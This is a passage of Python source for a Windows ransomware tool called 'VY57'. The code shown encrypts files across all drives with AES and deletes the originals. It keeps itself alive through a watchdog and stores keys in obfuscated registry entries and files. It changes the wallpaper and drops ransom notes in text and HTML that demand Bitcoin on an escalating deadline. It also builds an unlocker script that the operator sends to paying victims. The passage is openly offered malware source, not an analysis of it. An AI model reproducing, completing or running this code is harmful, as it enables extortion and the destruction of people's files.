            winreg.DeleteValue(key, PERSIST_NAME)
            winreg.CloseKey(key)
        except OSError:
            pass
    for path in (LNK_PATH, PERSIST_EXE, DONE_MARK, WATCH_MARK):
        try:
            os.remove(path)
        except OSError:
            pass


def _relaunch(target: str) -> bool:
    try:
        if IS_FROZEN:
            cmd = [target or original_exe(), '--quiet']
        else:
            cmd = [sys.executable, os.path.abspath(__file__), '--quiet']
        subprocess.Popen(cmd,
                         creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW,
                         close_fds=True)
        return True
    except Exception as exc:
        log_exc('relaunch failed', exc)
        return False


def spawn_watchdog() -> None:
    try:
        origin = original_exe()
        if IS_FROZEN:
            cmd = [origin, '--watch', str(os.getpid()), '--origin', origin]
        else:
            cmd = [sys.executable, os.path.abspath(__file__),
                   '--watch', str(os.getpid()), '--origin', origin]
        subprocess.Popen(cmd,
                         creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW,
                         close_fds=True)
        logline('watchdog started')
    except Exception as exc:
        log_exc('watchdog failed', exc)


def run_watchdog(ppid: int, origin: str) -> None:
    if os.path.exists(DONE_MARK):
        return
    try:
        k32 = ctypes.windll.kernel32
        k32.OpenProcess.restype = ctypes.c_void_p
        h = k32.OpenProcess(0x00100000, False, ppid)
        if h:
            k32.WaitForSingleObject(ctypes.c_void_p(h), 0xFFFFFFFF)
            k32.CloseHandle(ctypes.c_void_p(h))
    except Exception:
        return
    if os.path.exists(DONE_MARK):
        return
    count = 0
    try:
        with open(WATCH_MARK, 'r', encoding='utf-8') as fh:
            count = int(fh.read().strip() or '0')
    except (OSError, ValueError):
        count = 0
    if count >= 3:
        logline('watchdog: restart budget spent')
        return
    try:
        os.makedirs(KEY_DIR, exist_ok=True)
        with open(WATCH_MARK, 'w', encoding='utf-8') as fh:
            fh.write(str(count + 1))
    except OSError:
        pass
    time.sleep(2)
    if _relaunch(origin or original_exe()):
        logline(f'watchdog: relaunched parent (attempt {count + 1})')


# ---------------------------------------------------------------- wallpaper

def get_wallpaper() -> str:
    try:
        buf = ctypes.create_unicode_buffer(2048)
        if ctypes.windll.user32.SystemParametersInfoW(
                SPI_GETDESKWALLPAPER, 2048, buf, 0):
            return buf.value
    except Exception:
        pass
    return ''


def set_wallpaper(path: str) -> None:
    try:
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, os.path.abspath(path),
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
    except Exception as exc:
        log_exc('wallpaper failed', exc)


def _solid_bmp(path: str, w: int = 1920, h: int = 1080) -> None:
    pad = (-w * 3) % 4
    edge = bytes([30, 30, 190]) * w + b'\x00' * pad
    body = bytes([10, 5, 5]) * w + b'\x00' * pad
    rows = [edge if (y < 10 or y >= h - 10) else body for y in range(h)]
    data = b''.join(rows)
    size = 54 + len(data)
    header = (b'BM' + struct.pack('<IHHI', size, 0, 0, 54) +
              struct.pack('<IiiHHIIiiII', 40, w, h, 1, 24, 0, len(data),
                          2835, 2835, 0, 0))
    with open(path, 'wb') as fh:
        fh.write(header + data)


def paint_wallpaper() -> str:
    source = os.path.join(BASE, WALL_NAME)
    if not os.path.isfile(source):
        source = os.path.join(LOCAL_KEY_DIR, WALL_NAME)
        try:
            os.makedirs(os.path.dirname(source), exist_ok=True)
            if not os.path.isfile(source):
                _solid_bmp(source)
        except OSError as exc:
            log_exc('wallpaper build failed', exc)
            return ''
    set_wallpaper(source)
    logline('wallpaper replaced')
    return source


# ---------------------------------------------------------------- crypto

def pad(data: bytes) -> bytes:
    n = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
    return data + bytes([n]) * n


def unpad(data: bytes) -> bytes:
    if not data:
        return data
    n = data[-1]
    if 1 <= n <= BLOCK_SIZE and data[-n:] == bytes([n]) * n:
        return data[:-n]
    return data


def derive(master: bytes, iv: bytes, prefix: int) -> bytes:
    return hmac.new(master, bytes([prefix]) + iv, hashlib.sha256).digest()


def derive_iv(master: bytes, iv: bytes) -> bytes:
    return hmac.new(master, b'T' + iv, hashlib.sha256).digest()[:BLOCK_SIZE]


def new_master() -> bytes:
    return secrets.token_bytes(MASTER_LEN)


def new_vid() -> str:
    return secrets.token_hex(4)


def key_to_text(master: bytes) -> str:
    return base64.urlsafe_b64encode(master).decode().rstrip('=')


def text_to_key(text: str) -> bytes:
    text = text.strip()
    padn = (-len(text)) % 4
    master = base64.urlsafe_b64decode(text + '=' * padn)
    if len(master) != MASTER_LEN:
        raise ValueError(f'master is {len(master)} bytes, expected {MASTER_LEN}')
    return master


def obf(raw: bytes) -> str:
    return base64.b64encode(bytes(b ^ KEY_XOR for b in raw)).decode()


def deobf(text: str, key: int = None) -> bytes:
    k = KEY_XOR if key is None else key
    return bytes(b ^ k for b in base64.b64decode(text))


def _pub():
    if not PUB_B64:
        return None
    return RSA.import_key(base64.b64decode(PUB_B64))


def wrap_master(master: bytes) -> str:
    key = _pub()
    if key is None:
        return 'P:' + obf(master)
    return base64.b64encode(
        PKCS1_OAEP.new(key, hashAlgo=SHA256).encrypt(master)).decode()


def find_priv() -> str:
    for folder in (BASE, os.getcwd(), os.path.dirname(original_exe()),
                   LOCAL_KEY_DIR, KEY_DIR):
        cand = os.path.join(folder, 'vy57_priv.pem')
        if os.path.isfile(cand):
            return cand
    return os.path.join(BASE, 'vy57_priv.pem')


def unwrap_master(blob: str, priv_path: str = '') -> bytes:
    if blob.startswith('P:'):
        return deobf(blob[2:], STORE_XOR)
    path = priv_path or find_priv()
    if not os.path.isfile(path):
        raise OSError(f'private key not found: {path}')
    with open(path, 'rb') as fh:
        key = RSA.import_key(fh.read())
    return PKCS1_OAEP.new(key, hashAlgo=SHA256).decrypt(
        base64.b64decode(blob))


# ---------------------------------------------------------------- key store

def _reg_write(payload: dict) -> None:
    if winreg is None:
        return
    try:
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, KEY_REG, 0,
                                 winreg.KEY_WRITE)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ,
                          obf(json.dumps(payload).encode()))
        winreg.CloseKey(key)
    except OSError as exc:
        log_exc('registry key write failed', exc)


def _decode(text: str):
    """Decode a store blob, adopting whichever XOR byte wrote it."""
    try:
        raw = base64.b64decode(text)
    except (binascii.Error, ValueError):
        return None, None
    for key in (KEY_XOR,) + tuple(range(1, 256)):
        try:
            payload = json.loads(bytes(b ^ key for b in raw).decode('utf-8'))
        except (ValueError, UnicodeDecodeError):
            continue
        if isinstance(payload, dict) and payload.get('w'):
            return payload, key
    return None, None


def _adopt(key: int) -> None:
    global STORE_XOR
    if key != KEY_XOR and STORE_XOR != key:
        logline(f'store was written with KEY_XOR=0x{key:02X} - adopting')
    STORE_XOR = key


def _reg_read():
    if winreg is None:
        return None
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY_REG, 0,
                             winreg.KEY_READ)
    except OSError:
        return None
    try:
        value, _ = winreg.QueryValueEx(key, '')
    except OSError:
        return None
    finally:
        winreg.CloseKey(key)
    payload, found = _decode(value)
    if payload:
        _adopt(found)
    return payload


def write_store(payload: dict) -> None:
    _reg_write(payload)
    blob = obf(json.dumps(payload).encode())
    for folder in (KEY_DIR, LOCAL_KEY_DIR):
        try:
            os.makedirs(folder, exist_ok=True)
        except OSError:
            pass
    for path in (KEY_FILE, KEY_COPY):
        tmp = path + '.tmp'
        try:
            with open(tmp, 'w', encoding='utf-8') as fh:
                fh.write(blob)
            os.replace(tmp, path)
        except OSError as exc:
            log_exc(f'could not write {path}', exc)


def read_store():
    found = _reg_read()
    if found:
        return found
    for path in (KEY_FILE, KEY_COPY):
        try:
            with open(path, 'r', encoding='utf-8') as fh:
                blob = fh.read().strip()
        except OSError:
            continue
        if not blob:
            continue
        payload, key = _decode(blob)
        if payload:
            _adopt(key)
            return payload
    return None


def master_of(payload: dict) -> bytes:
    """Local master: DPAPI first, then plaintext fallback, then priv key."""
    blob = payload.get('d')
    if blob:
        try:
            return dpapi_unprotect(base64.b64decode(blob))
        except Exception as exc:
            log_exc('dpapi unprotect failed', exc)
    wrapped = payload.get('w') or ''
    if wrapped.startswith('P:'):
        return deobf(wrapped[2:], STORE_XOR)
    return unwrap_master(wrapped, arg_value('--priv') or '')


# ---------------------------------------------------------------- scope

def discover_roots(scope: str) -> list:
    if scope == 'user':
        home = os.path.expanduser('~')
        roots = [home]
        public = os.path.abspath(os.path.join(home, '..', 'Public'))
        if os.path.isdir(public):
            roots.append(public)
        return roots

    roots = []
    for letter in string.ascii_uppercase:
        drive = f'{letter}:\\'
        if os.path.isdir(drive):
            roots.append(drive)
    return roots


def new_drives(known: list) -> list:
    low = {r.lower() for r in known}
    return [r for r in discover_roots('all') if r.lower() not in low]


def should_skip_dir(full: str, name: str) -> bool:
    if name in SKIP_DIR_NAMES:
        return True
    lowered = full.lower()
    for fragment in SKIP_DIR_FRAGMENTS:
        if fragment.lower() in lowered:
            return True
    try:
        st = os.lstat(full)
    except OSError:
        return True
    if getattr(st, 'st_file_attributes', 0) & stat.FILE_ATTRIBUTE_REPARSE_POINT:
        return True
    return False


# ---------------------------------------------------------------- listing

def already_done(path: str) -> bool:
    try:
        with open(_prep(path), 'rb') as fh:
            return fh.read(len(MAGIC)) == MAGIC
    except OSError:
        return False


def list_plain(roots: list, retry: list = None) -> list:
    found, held = [], []
    for root in roots:
        start = _prep(root)
        for dirpath, dirnames, filenames in os.walk(start):
            dirnames[:] = [d for d in dirnames
                           if not should_skip_dir(os.path.join(dirpath, d), d)]
            for name in filenames:
                if name in SKIP_NAMES:
                    continue
                if os.path.splitext(name)[1].lower() in SKIP_EXTENSIONS:
                    continue
                full = os.path.join(dirpath, name)
                try:
                    if os.path.islink(full):
                        continue
                    if MAX_SIZE and os.path.getsize(full) > MAX_SIZE:
                        continue
                except OSError:
                    continue
                if already_done(full):
                    continue
                if os.path.exists(full + EXT):
                    continue
                (held if is_locked(full) else found).append(full)
    if retry is not None:
        retry.extend(held)
    return found


def list_encrypted(roots: list) -> list:
    found = []
    for root in roots:
        start = _prep(root)
        for dirpath, dirnames, filenames in os.walk(start):
            dirnames[:] = [d for d in dirnames
                           if not should_skip_dir(os.path.join(dirpath, d), d)]
            for name in filenames:
                if not (name.endswith(EXT) or name.endswith(SUFFIX)):
                    continue
                full = os.path.join(dirpath, name)
                if already_done(full):
                    found.append(full)
    return found


def count_per_root(roots: list) -> None:
    for root in roots:
        total = 0
        start = _prep(root)
        for dirpath, dirnames, filenames in os.walk(start):
            dirnames[:] = [d for d in dirnames
                           if not should_skip_dir(os.path.join(dirpath, d), d)]
            total += len(filenames)
        logline(f'  {root}  ->  {total} entry(s)')


# ---------------------------------------------------------------- per file

def make_writable(path: str) -> None:
    try:
        os.chmod(path, stat.S_IWRITE)
    except OSError:
        pass


def mark_encrypted(path: str) -> None:
    try:
        attrs = os.stat(path).st_file_attributes
        ctypes.windll.kernel32.SetFileAttributesW(
            _prep(path), attrs | stat.FILE_ATTRIBUTE_ENCRYPTED)
    except Exception:
        pass


def _tmp_for(src_path: str) -> str:
    """Sibling temp file, degrading to %TEMP% if the volume refuses."""
    candidate = src_path + '.tmp'
    try:
        with open(candidate, 'wb'):
            pass
        return candidate
    except OSError:
        tag = hashlib.sha1(os.path.normcase(src_path).encode('utf-8',
                                                             'replace'))
        return os.path.join(tempfile.gettempdir(),
                            'v57-' + tag.hexdigest()[:20] + '.tmp')


def _commit(tmp: str, final: str) -> None:
    """os.replace, with a copy path for the cross-volume case."""
    try:
        os.replace(tmp, final)
    except OSError:
        shutil.copyfile(tmp, final)
        try:
            os.remove(tmp)
        except OSError:
            pass


def encrypt_file(master: bytes, path: str) -> bool:
    src_path = _prep(path)
    try:
        st = os.stat(src_path)
        size = st.st_size
    except OSError:
        return False

    if not dir_writable(os.path.dirname(src_path) or '.'):
        return True

    with QUEUE_LOCK:
        if already_done(path) or os.path.exists(path + EXT):
            return True

    intermittent = size > FULL_LIMIT and '--full' not in sys.argv
    iv = secrets.token_bytes(BLOCK_SIZE)
    fk = derive(master, iv, 0x6B)
    tk = derive(master, iv, 0x74)
    head_cipher = AES.new(fk, AES.MODE_CBC, iv)
    tail_cipher = AES.new(fk, AES.MODE_CBC, derive_iv(master, iv)) \
        if intermittent else None
    tagger = hmac.new(tk, digestmod=hashlib.sha256)

    tmp = _tmp_for(src_path)
    final = _prep(path + EXT)
    make_writable(src_path)

    head_pt_len = HEAD_LEN if intermittent else size
    tail_pt_len = TAIL_LEN if intermittent else 0

    try:
        with open(src_path, 'rb') as src, open(tmp, 'wb') as dst:
            ct_head = head_cipher.encrypt(pad(src.read(head_pt_len)))
            if intermittent:
                src.seek(size - tail_pt_len)
                ct_tail = tail_cipher.encrypt(pad(src.read(tail_pt_len)))
            else:
                ct_tail = b''

            hdr = (MAGIC + bytes([FMT_VER, 1 if intermittent else 0]) + iv +
                   struct.pack('<II', len(ct_head), len(ct_tail)))
            dst.write(hdr)
            dst.write(ct_head)
            tagger.update(hdr)
            tagger.update(ct_head)

            if intermittent:
                src.seek(head_pt_len)
                remaining = size - head_pt_len - tail_pt_len
                while remaining > 0:
                    chunk = src.read(min(CHUNK, remaining))
                    if not chunk:
                        break
                    dst.write(chunk)
                    remaining -= len(chunk)
                dst.write(ct_tail)
                tagger.update(ct_tail)

            dst.write(tagger.digest()[:TAG_LEN])
            dst.flush()
            os.fsync(dst.fileno())
        _commit(tmp, final)
        try:
            os.remove(src_path)
        except OSError:
            pass
        try:
            os.utime(final, (st.st_atime, st.st_mtime))
        except OSError:
            pass
        mark_encrypted(final)
        return True
    except Exception as exc:
        log_exc(f'encrypt failed {path}', exc)
        if os.path.exists(tmp):
            try:
                os.remove(tmp)
            except OSError:
                pass
        return False


def _plain_name(path: str) -> str:
    if path.endswith(EXT):
        return path[:-len(EXT)]
    if path.endswith(SUFFIX):
        return path[:-len(SUFFIX)]
    return path + '.out'


def decrypt_file(master: bytes, path: str) -> bool:
    src_path = _prep(path)
    try:
        st = os.stat(src_path)
        total = st.st_size
    except OSError:
        return False
    if total < MIN_BLOB:
        return False

    if not dir_writable(os.path.dirname(src_path) or '.'):
        return True

    target = _prep(_plain_name(path))
    tmp = _tmp_for(src_path)
    make_writable(src_path)

    try:
        with open(src_path, 'rb') as src:
            head = src.read(HDR_LEN)
            if head[:len(MAGIC)] != MAGIC or head[len(MAGIC)] != FMT_VER:
                return False
            iv = head[len(MAGIC) + 2:HDR_LEN - 8]
            ct_head_len, ct_tail_len = struct.unpack('<II', head[HDR_LEN - 8:])
            if ct_head_len % BLOCK_SIZE or ct_tail_len % BLOCK_SIZE:
                return False
            middle_len = total - HDR_LEN - ct_head_len - ct_tail_len - TAG_LEN
            if middle_len < 0:
                return False

            ct_head = src.read(ct_head_len)
            ct_tail = b''
            if ct_tail_len:
                src.seek(total - TAG_LEN - ct_tail_len)
                ct_tail = src.read(ct_tail_len)

            fk = derive(master, iv, 0x6B)
            tk = derive(master, iv, 0x74)
            tagger = hmac.new(tk, digestmod=hashlib.sha256)
            tagger.update(head)
            tagger.update(ct_head)
            tagger.update(ct_tail)

            src.seek(total - TAG_LEN)
            stored = src.read(TAG_LEN)
            if not hmac.compare_digest(tagger.digest()[:TAG_LEN], stored):
                raise ValueError('tag mismatch')

            head_plain = unpad(AES.new(fk, AES.MODE_CBC, iv).decrypt(ct_head))
            tail_plain = unpad(AES.new(
                fk, AES.MODE_CBC, derive_iv(master, iv)).decrypt(ct_tail)) \
                if ct_tail_len else b''

            src.seek(HDR_LEN + ct_head_len)
            with open(tmp, 'wb') as dst:
                dst.write(head_plain)
                remaining = middle_len
                while remaining > 0:
                    chunk = src.read(min(CHUNK, remaining))
                    if not chunk:
                        break
                    dst.write(chunk)
                    remaining -= len(chunk)
                dst.write(tail_plain)
                dst.flush()
                os.fsync(dst.fileno())

        _commit(tmp, target)
        try:
            os.remove(src_path)
        except OSError:
            pass
        try:
            os.utime(target, (st.st_atime, st.st_mtime))
        except OSError:
            pass
        return True
    except Exception as exc:
        log_exc(f'decrypt failed {path}', exc)
        if os.path.exists(tmp):
            try:
                os.remove(tmp)
            except OSError:
                pass
        return False


def _run_batch(fn, master: bytes, files: list, label: str,
               workers: int = 0) -> tuple:
    if not files:
        return 0, []
    workers = workers or WORKERS

    def task(path):
        ok = fn(master, path)
        with COUNTER_LOCK:
            DONE_COUNTER['n'] += 1
            if DONE_COUNTER['n'] % 250 == 0:
                logline(f'  {label} {DONE_COUNTER["n"]}')
        return path, ok

    with ThreadPoolExecutor(max_workers=workers) as pool:
        results = list(pool.map(task, files))
    return sum(1 for _p, ok in results if ok), [p for p, ok in results if not ok]


def _drain(fn, master: bytes, files: list, label: str, ramp: bool) -> tuple:
    if ramp and len(files) > RAMP_FILES:
        head, tail = files[:RAMP_FILES], files[RAMP_FILES:]
        done, failed = _run_batch(fn, master, head, label, RAMP_WORKERS)
        logline(f'  ramp done - widening to {WORKERS} worker(s)')
        more, bad = _run_batch(fn, master, tail, label, WORKERS)
        return done + more, failed + bad
    return _run_batch(fn, master, files, label, WORKERS)


def encrypt_all(master: bytes, roots: list, files: list = None,
                ramp: bool = True, reset: bool = True) -> int:
    files = list_plain(roots) if files is None else files
    random.shuffle(files)
    if reset:
        DONE_COUNTER['n'] = 0
    logline(f'Encrypting {len(files)} file(s) across {len(roots)} root(s), '
            f'{WORKERS} worker(s)')

    total, failed = _drain(encrypt_file, master, files, 'progress', ramp)

    for attempt in range(1, RETRY_PASSES + 1):
        retry = [p for p in failed
                 if os.path.exists(_prep(p)) and not is_locked(p)]
        if not retry:
            break
        logline(f'  retry pass {attempt}: {len(retry)} held file(s)')
        time.sleep(3 * attempt)
        ok, failed = _drain(encrypt_file, master, retry, 'retry', False)
        total += ok

    if failed:
        logline(f'  {len(failed)} file(s) could not be encrypted')
    logline(f'Encrypted {total}/{len(files)}')
    return total


def decrypt_all(master: bytes, roots: list) -> int:
    files = list_encrypted(roots)
    random.shuffle(files)
    DONE_COUNTER['n'] = 0
    logline(f'Decrypting {len(files)} file(s) across {len(roots)} root(s)')
    done, failed = _drain(decrypt_file, master, files, 'progress', False)
    if failed:
        logline(f'  {len(failed)} file(s) could not be decrypted')
    logline(f'Decrypted {done}/{len(files)}')
    return done


# ---------------------------------------------------------------- notes

def deadline_epoch(payload: dict) -> float:
    return float(payload.get('t') or time.time()) + DEADLINE_HOURS * 3600


def price_now(payload: dict) -> int:
    left = deadline_epoch(payload) - time.time()
    if left <= 0:
        return BASE_PRICE * 4
    if left <= DEADLINE_HOURS * 1800:
        return BASE_PRICE * 2
    return BASE_PRICE


def _note_text(payload: dict, count: int) -> str:
    due = time.strftime('%Y-%m-%d %H:%M',
                        time.localtime(deadline_epoch(payload)))
    return '\n'.join((
        '=========================================================',
        '   YOUR FILES HAVE BEEN ENCRYPTED BY VY57',
        '=========================================================',
        '',
        f'   Victim ID : {payload.get("i", VID)}',
        f'   Files     : {count}',
        f'   Price     : ${price_now(payload)} USD  '
        f'(x2 after 36h, x4 after 72h)',
        f'   Deadline  : {due}',
        '',
        f'Every file on this computer now ends in {EXT} and will',
        'not open. Shadow copies, restore points, the backup',
        'catalog, the USN journal and hiberfil.sys have been',
        'destroyed. There is no local recovery.',
        '',
        'To restore your data:',
        f'  1. Send ${price_now(payload)} USD in BitCoin to:',
        '',
        '         ' + ADDRESS,
        '',
        '  2. Contact the operator with your Victim ID and proof',
        '     of payment.',
        '',
        '  3. You will receive unlock.bat and unlock.ps1.',
        '     Save both in the SAME folder, then double-click',
        '     unlock.bat and wait for it to finish.',
        '',
        f'Do not delete the {EXT} files. Do not run chkdsk.',
        'Do not reinstall anything. The key is not stored in',
        'readable form on this disk.',
        '',
        '=========================================================',
    )) + '\n'


def _note_html(payload: dict, count: int) -> str:
    due = time.strftime('%Y-%m-%d %H:%M',
                        time.localtime(deadline_epoch(payload)))
    return f"""<!doctype html><meta charset="utf-8">
<title>READ ME - {payload.get('i', VID)}</title>
<style>
 body{{background:#0a0505;color:#d8d8d8;font:16px/1.6 Consolas,monospace;
      padding:48px;max-width:820px;margin:auto}}
 h1{{color:#c62828;font-size:26px;letter-spacing:1px}}
 code{{background:#fff;color:#000;padding:10px 14px;display:inline-block;
       font-size:17px}}
 ol{{line-height:2}} .k{{color:#ff9800}} .id{{color:#4fc3f7}}
 table{{border-collapse:collapse;margin:16px 0}}
 td{{padding:2px 18px 2px 0}} td:first-child{{color:#888}}
</style>
<h1>YOUR FILES HAVE BEEN ENCRYPTED BY VY57</h1>
<table>
 <tr><td>Victim ID</td><td class="id">{payload.get('i', VID)}</td></tr>
 <tr><td>Files</td><td>{count}</td></tr>
 <tr><td>Price</td><td>${price_now(payload)} USD (x2 after 36h, x4 after 72h)</td></tr>
 <tr><td>Deadline</td><td>{due}</td></tr>
</table>
<p>Every file on this computer now ends in <b>{EXT}</b> and will not open.
Shadow copies, restore points, the backup catalog, the USN journal and
hiberfil.sys have been destroyed. There is no local recovery.</p>
<h2>To restore your data</h2>
<ol>
 <li>Send <b>${price_now(payload)} USD</b> in BitCoin to:<br><code>{ADDRESS}</code></li>
 <li>Contact the operator with your Victim ID and proof of payment.</li>
 <li>You will receive <b>unlock.bat</b> and <b>unlock.ps1</b>. Save both in
     the <b>same folder</b>, then double-click unlock.bat and wait.</li>
</ol>
<p class="k">Do not delete the {EXT} files. Do not run chkdsk.
Do not reinstall anything. The key is not stored in readable form on this disk.</p>
"""


def drop_notes(roots: list, payload: dict, count: int) -> list:
    targets = note_targets(roots)
    body = _note_text(payload, count)
    html = _note_html(payload, count)
    dropped = []
    for folder in targets:
        if not dir_writable(folder):
            continue
        for name, blob in ((NOTE_NAME, body), (NOTE_HTML, html)):
            target = os.path.join(folder, name)
            try:
                with open(target, 'w', encoding='utf-8') as fh:
                    fh.write(blob)
                strip_zone(target)
                dropped.append(target)
            except OSError as exc:
                log_exc(f'note failed {target}', exc)
    logline(f'notes dropped ({len(targets)} folder(s))')
    return dropped


def remove_notes(roots: list) -> None:
    for folder in note_targets(roots):
        for name in (NOTE_NAME, NOTE_HTML):
            try:
                os.remove(os.path.join(folder, name))
            except OSError:
                pass


# ---------------------------------------------------------------- unlocker

PS1_TEMPLATE = r"""# VY57 unlocker - run unlock.bat, do not edit
$ErrorActionPreference = 'Stop'
$masters = New-Object 'System.Collections.Generic.List[byte[]]'
{masters}

$magic  = [byte[]](137,86,89,55,13,10,26,10)
$tagLen = {taglen}

$roots = @(
{roots}
)

function Get-Key([byte[]]$master, [byte]$prefix, [byte[]]$iv) {{
    $ms = New-Object System.IO.MemoryStream
    $ms.WriteByte($prefix)
    $ms.Write($iv, 0, $iv.Length)
    $hm = New-Object System.Security.Cryptography.HMACSHA256(,$master)
    $out = $hm.ComputeHash($ms.ToArray())
    $hm.Dispose(); $ms.Dispose()
    return ,$out
}}

function Get-IvTail([byte[]]$master, [byte[]]$iv) {{
    $ms = New-Object System.IO.MemoryStream
    $ms.WriteByte(84)
    $ms.Write($iv, 0, $iv.Length)
    $hm = New-Object System.Security.Cryptography.HMACSHA256(,$master)
    $out = $hm.ComputeHash($ms.ToArray())
    $hm.Dispose(); $ms.Dispose()
    $t = New-Object byte[] 16
    [Array]::Copy($out, $t, 16)
    return ,$t
}}

function Unpad([byte[]]$data) {{
    if ($data.Length -eq 0) {{ return ,$data }}
    $n = [int]$data[$data.Length - 1]
    if ($n -ge 1 -and $n -le 16) {{
        $len = $data.Length - $n
        if ($len -le 0) {{ return ,([byte[]]@()) }}
        $o = New-Object byte[] $len
        [Array]::Copy($data, $o, $len)
        return ,$o
    }}
    return ,$data
}}

function Dec([byte[]]$key, [byte[]]$iv, [byte[]]$ct) {{
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'None'
    $aes.Key = $key
    $aes.IV = $iv
    $d = $aes.CreateDecryptor()
    $out = $d.TransformFinalBlock($ct, 0, $ct.Length)
    $d.Dispose(); $aes.Dispose()
    return ,$out
}}

$ok = 0
$bad = 0

foreach ($root in $roots) {{
    if (-not (Test-Path -LiteralPath $root)) {{ Write-Host "SKIP $root"; continue }}
    Write-Host "--- $root"
    $files = Get-ChildItem -LiteralPath $root -Recurse -File -Filter *{ext} -ErrorAction SilentlyContinue
    foreach ($f in $files) {{
        try {{
            $st = $f.LastWriteTime
            $blob = [IO.File]::ReadAllBytes($f.FullName)
            if ($blob.Length -lt {minlen}) {{ throw 'too short' }}
            for ($i = 0; $i -lt 8; $i++) {{ if ($blob[$i] -ne $magic[$i]) {{ throw 'bad magic' }} }}
            if ($blob[8] -ne {ver}) {{ throw 'bad version' }}

            $iv = New-Object byte[] 16
            [Array]::Copy($blob, 10, $iv, 0, 16)
            $cth = [int][BitConverter]::ToUInt32($blob, 26)
            $ctt = [int][BitConverter]::ToUInt32($blob, 30)
            if (($cth % 16) -or ($ctt % 16)) {{ throw 'bad lengths' }}
            $midLen = [int]($blob.Length - {hdr} - $cth - $ctt - $tagLen)
            if ($midLen -lt 0) {{ throw 'bad body' }}

            $ctHead = New-Object byte[] $cth
            [Array]::Copy($blob, {hdr}, $ctHead, 0, $cth)
            $ctTail = New-Object byte[] $ctt
            if ($ctt -gt 0) {{
                [Array]::Copy($blob, $blob.Length - $tagLen - $ctt, $ctTail, 0, $ctt)
            }}
            $tag = New-Object byte[] $tagLen
            [Array]::Copy($blob, $blob.Length - $tagLen, $tag, 0, $tagLen)

            $headPlain = $null
            $tailPlain = $null
            foreach ($m in $masters) {{
                $tk = Get-Key $m 116 $iv
                $hm = New-Object System.Security.Cryptography.HMACSHA256(,$tk)
                $hm.TransformBlock($blob, 0, {hdr}, $null, 0) | Out-Null
                $hm.TransformBlock($ctHead, 0, $cth, $null, 0) | Out-Null
                if ($ctt -gt 0) {{
                    $hm.TransformBlock($ctTail, 0, $ctt, $null, 0) | Out-Null
                }}
                $calc = $hm.TransformFinalBlock([byte[]]@(), 0, 0)
                $hm.Dispose()
                $same = $true
                for ($i = 0; $i -lt $tagLen; $i++) {{
                    if ($calc[$i] -ne $tag[$i]) {{ $same = $false; break }}
                }}
                if ($same) {{
                    $fk = Get-Key $m 107 $iv
                    $headPlain = Unpad (Dec $fk $iv $ctHead)
                    if ($ctt -gt 0) {{
                        $tailPlain = Unpad (Dec $fk (Get-IvTail $m $iv) $ctTail)
                    }} else {{ $tailPlain = [byte[]]@() }}
                    break
                }}
            }}
            if ($null -eq $headPlain) {{ throw 'no matching key' }}

            $ms2 = New-Object System.IO.MemoryStream
            $ms2.Write($headPlain, 0, $headPlain.Length)
            if ($midLen -gt 0) {{
                $ms2.Write($blob, {hdr} + $cth, $midLen)
            }}
            if ($tailPlain.Length -gt 0) {{
                $ms2.Write($tailPlain, 0, $tailPlain.Length)
            }}

            $out = $f.FullName.Substring(0, $f.FullName.Length - {extlen})
            [IO.File]::WriteAllBytes($out, $ms2.ToArray())
            $ms2.Dispose()
            Remove-Item -LiteralPath $f.FullName -Force
            (Get-Item -LiteralPath $out).LastWriteTime = $st
            Write-Host "OK   $out"
            $ok++
        }} catch {{
            Write-Host "FAIL $($f.FullName) : $_"
            $bad++
        }}
    }}
}}

Write-Host ""
Write-Host "Restored: $ok    Failed: $bad"
"""

BAT_TEMPLATE = """@echo off
title VY57 unlocker
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0unlock.ps1"
echo.
pause
"""


def make_unlocker() -> None:
    payload = read_store()
    if not payload:
        die('no stored key - place the victim key.dat first')

    given = arg_value('--key')
    masters = []
    try:
        if given:
            masters.append(text_to_key(given))
        else:
            masters.append(master_of(payload))
    except Exception as exc:
        die(f'cannot unwrap master: {exc}')

    roots = payload.get('r') or []
    if not roots:
        die('no roots stored in the payload')

    ext = payload.get('e') or EXT
    ps1 = PS1_TEMPLATE.format(
        masters='\n'.join(
            "$masters.Add([Convert]::FromBase64String('"
            f"{base64.b64encode(m).decode()}'))" for m in masters),
        roots='\n'.join(f"    '{_unprep(r).replace(chr(39), chr(39) * 2)}'"
                        for r in roots),
        ext=ext,
        extlen=len(ext),
        taglen=TAG_LEN,
        minlen=MIN_BLOB,
        hdr=HDR_LEN,
        ver=FMT_VER,
    )

    folder = out_dir()
    out_ps1 = os.path.join(folder, 'unlock.ps1')
    out_bat = os.path.join(folder, 'unlock.bat')
    out_info = os.path.join(folder, 'unlocker_info.txt')

    try:
        with open(out_ps1, 'w', encoding='utf-8-sig') as fh:
            fh.write(ps1)
        with open(out_bat, 'w', encoding='utf-8', newline='\r\n') as fh:
            fh.write(BAT_TEMPLATE)
        with open(out_info, 'w', encoding='utf-8') as fh:
            fh.write(f'victim : {payload.get("i", VID)}\n')
            fh.write(f'key    : {key_to_text(masters[0])}\n')
            fh.write(f'ext    : {ext}\n')
            for root in roots:
                fh.write(f'root   : {_unprep(root)}\n')
    except OSError as exc:
        die(f'cannot write unlocker: {exc}')

    logline(f'Victim: {payload.get("i", VID)}')
    logline(f'Key   : {key_to_text(masters[0])}')
    logline(f'Roots : {[_unprep(r) for r in roots]}')
    logline(f'Built : {out_ps1}')
    logline(f'Built : {out_bat}')
    logline(f'Built : {out_info}')
    logline('Send BOTH script files. The victim double-clicks unlock.bat.')


# ---------------------------------------------------------------- generators

def _hexlit(text: str) -> str:
    h = text.encode().hex()
    parts, i = [], 0
    while i < len(h):
        n = random.randint(4, 14)
        parts.append(h[i:i + n])
        i += n
    return ' '.join(f"'{p}'" for p in parts)


def _wrap_pem(b64: str, width: int = 66) -> str:
    return '\n'.join(f"    {b64[i:i + width]!r}"
                     for i in range(0, len(b64), width))


def lits_body() -> str:
    reverse = {'ADDRESS', 'NOTE_NAME', 'NOTE_HTML', 'WALL_NAME'}
    table = (
